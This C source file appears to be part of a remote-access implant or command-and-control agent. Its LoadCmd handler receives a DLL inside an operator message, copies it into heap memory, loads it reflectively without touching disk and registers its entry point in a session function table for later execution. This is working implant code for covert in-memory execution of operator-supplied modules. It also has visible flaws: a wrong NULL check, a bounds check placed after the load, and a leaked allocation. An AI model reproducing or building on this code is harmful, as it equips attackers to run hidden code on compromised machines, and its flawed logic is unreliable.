#include "commands.h"
#include "debug.h"
#include "loader.h"
#include "session.h"

extern SESSION_CTX session_ctx;

/*
@brief Function that loads a dll into memory and resolves its dependencies
@param PMESSAGE containts the parameters for the command
@param PMESSAGE is a pointer to the result that will be sent back
@return ERROR_T with status of load
*/
ERROR_T LoadCmd(PMESSAGE pMsg, PMESSAGE *pResult) {
    INT iError = E_SUCCESS;
    PDWORD pRemoteModuleID = NULL;
    PDWORD pDLLFileLen = NULL;
    PBYTE pDLLFile = NULL;
    PVOID pFuncAddr = NULL;
    PVOID pDLLAddr = NULL;

    *pResult = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(MESSAGE));
    if (NULL == pResult) {
        iError = E_MEMORY_ERROR;
        goto end;
    }

    pRemoteModuleID = (PDWORD) pMsg->pData;
    pDLLFileLen = ((PBYTE) pRemoteModuleID + sizeof(DWORD));
    pDLLFile = ((PBYTE) pDLLFileLen + sizeof(DWORD));

    DBG_PRINT("Module Id: %d DLL LEN %d\n", *pRemoteModuleID, *pDLLFileLen);

    pDLLAddr = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *pDLLFileLen);
    if (NULL == pDLLAddr)
    {
        iError = E_MEMORY_ERROR;
        goto end;
    }

    memcpy(pDLLAddr, pDLLFile, *pDLLFileLen);

    pFuncAddr = LoadMemoryModule(pDLLAddr, "func");
    if (NULL == pFuncAddr)
    {
        iError = E_FAILURE;
        goto end;
    }

    DBG_PRINT("DLL loaded at %p\n", pFuncAddr);

    if ((FUNCARRAYSIZE - 1) < *pRemoteModuleID)
    {
        iError = E_CMD_NOT_FOUND;
        DBG_PRINT("Command not found\n");
        goto end;
    }
    session_ctx.pFuncArray[*pRemoteModuleID] = pFuncAddr;

end:
    (*pResult)->hdr.dwCommand = pMsg->hdr.dwCommand;
    (*pResult)->hdr.dwJobID = pMsg->hdr.dwJobID;
    (*pResult)->hdr.dwMessageSize = sizeof(MESSAGE_HEADER);
    (*pResult)->hdr.dwResultCode = iError;

    return iError;
}